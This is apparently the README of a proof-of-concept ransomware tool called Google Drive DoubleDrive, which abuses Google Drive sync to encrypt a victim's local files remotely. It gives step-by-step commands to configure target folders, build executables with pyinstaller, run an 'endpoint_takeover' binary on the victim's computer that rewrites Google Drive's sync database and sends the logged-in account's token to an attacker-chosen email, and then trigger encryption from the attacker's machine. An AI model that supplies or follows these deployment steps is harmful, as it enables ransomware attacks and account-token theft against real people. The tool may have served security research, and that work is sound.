# Google Drive DoubleDrive
A DoubleDrive variant that uses Google Drive to encrypt local files remotely.

## How to use
1. Make sure you clone the DoubleDrive repo and install the DoubleDrive python package. If you are currently in the google_drive_doubledrive folder then run:
```cmd
pip install ../
```
2. Use `config_setup.py` to setup the exact configuration you want for the ransomware. For example:
```cmd
python .\config_setup.py --temp-email --target-paths C:\Users\Admin\Documents C:\Users\Admin\Desktop
```
3. While you are in the google_drive_doubledrive folder, run:
```cmd
pyinstaller --onefile --add-data "config.yaml;." .\endpoint_takeover.py; pyinstaller --onefile --add-data "config.yaml;." .\google_drive_doubledrive.py
```
4. A folder named `dist` will be created. Inside you can find `endpoint_takeover.exe` and `google_drive_doubledrive.exe`
5. Transfer `endpoint_takeover.exe` to the victim computer and run it. This will create change Google Drive's database to sync the target paths to encrypt. It will also extract the token of the currently logged in Google Drive account and exfiltrate it by sharing it with the email address chosen in the configuration setup stage.
> Note - If you chose a temporary email address you should continue to the next step as soon as possible because the generated temporary email address that DoubleDrive uses works for a limited amount of time.
6. Execute `google_drive_doubledrive` with the preferred flags on the attacker's computer. For example:
```cmd
google_drive_doubledrive.exe
```